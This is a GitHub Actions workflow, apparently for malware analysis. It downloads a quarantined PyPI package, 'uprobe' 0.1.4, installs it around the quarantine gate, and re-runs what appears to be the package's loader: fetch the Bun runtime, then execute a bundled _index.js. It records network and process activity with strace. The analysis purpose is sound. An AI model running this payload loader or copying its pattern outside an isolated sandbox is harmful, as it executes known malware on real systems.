name: Analyze uprobe Quarantined Package

on:
  workflow_dispatch:

permissions: read-all

jobs:
  download-wheel:
    runs-on: ubuntu-latest
    steps:
      - name: Harden the runner (Audit all outbound calls)
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: Download quarantined wheel directly from files.pythonhosted.org
        run: |
          mkdir -p /tmp/packages
          cd /tmp/packages
          curl -fL -o uprobe-0.1.4-py3-none-any.whl \
            https://files.pythonhosted.org/packages/df/31/a03ea8534bdad483ba856f85ff57aaccc642d432388c55b046d45a788c59/uprobe-0.1.4-py3-none-any.whl
          ls -la
          sha256sum uprobe-0.1.4-py3-none-any.whl

      - name: Upload wheel
        uses: actions/upload-artifact@v4
        with:
          name: uprobe-0.1.4-wheel
          path: /tmp/packages/uprobe-0.1.4-py3-none-any.whl
          retention-days: 90

  install-and-run:
    runs-on: ubuntu-latest
    needs: download-wheel
    steps:
      - name: Harden the runner (Audit all outbound calls)
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Download wheel from artifact
        uses: actions/download-artifact@v4
        with:
          name: uprobe-0.1.4-wheel
          path: /tmp/packages

      - name: Install local wheel (bypasses PyPI quarantine gate)
        run: |
          python -m pip install --no-deps /tmp/packages/uprobe-0.1.4-py3-none-any.whl
          python -m pip show uprobe

      - name: Write and execute fixed payload
        continue-on-error: true
        env:
          GITHUB_REPOSITORY: xyz/xyz
        run: |
          PKG_DIR=$(python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))")
          echo "package dir: $PKG_DIR"
          cat > /tmp/run_payload.py << PYEOF
          import os, subprocess, urllib.request, platform, sys, tempfile, glob, zipfile, shutil

          pkg_dir = "$PKG_DIR"
          _j = os.path.join(pkg_dir, "_index.js")
          if not os.path.exists(_j):
              _c = glob.glob(os.path.join(pkg_dir, "*", "_index.js"))
              _j = _c[0] if _c else ""

          print(f"_index.js: {_j} (exists={os.path.exists(_j)}, size={os.path.getsize(_j) if os.path.exists(_j) else 0})")

          _e = os.name == "nt"
          _b = os.path.join(tempfile.gettempdir(), "b", "bun" + (".exe" if _e else ""))
          os.makedirs(os.path.dirname(_b), exist_ok=True)

          if not os.path.exists(_b):
              _a = "aarch64" if platform.machine() == "arm64" else "x64"
              _m = {"linux": "linux", "darwin": "darwin", "win32": "windows"}.get(sys.platform, "linux")
              _z = os.path.join(tempfile.gettempdir(), "b.zip")
              url = f"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-{_m}-{_a}.zip"
              print(f"Downloading Bun from: {url}")
              urllib.request.urlretrieve(url, _z)
              zipfile.ZipFile(_z).extractall(os.path.dirname(_b))
              _found = glob.glob(os.path.join(os.path.dirname(_b), "*", "bun" + (".exe" if _e else "")))
              if _found:
                  shutil.move(_found[0], _b)
              os.chmod(_b, 0o755)
              os.unlink(_z)
              print(f"Bun installed at: {_b}")

          print(f"Running: {_b} run {_j}")
          result = subprocess.run([_b, "run", _j], check=False)
          print(f"bun exit code: {result.returncode}")
          PYEOF
          strace -f -e trace=network,execve,openat -o /tmp/uprobe-strace.log \
            python /tmp/run_payload.py 2>&1 || true

      - name: Wait for _index.js execution
        run: sleep 120

      - name: Check for malware artifacts
        continue-on-error: true
        run: |
          echo "=== /tmp ==="
          ls -la /tmp/
          echo "=== Bun binary ==="
          ls -la /tmp/b/ || echo "(not present)"
          echo "=== background processes ==="
          ps aux | grep -E "bun|node|curl|wget|nohup" | grep -v grep || echo "None"
          echo "=== strace connect/execve ==="
          grep -E "connect|execve" /tmp/uprobe-strace.log | head -30 || true

      - name: Upload strace log
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: uprobe-strace
          path: /tmp/uprobe-strace.log
          retention-days: 30

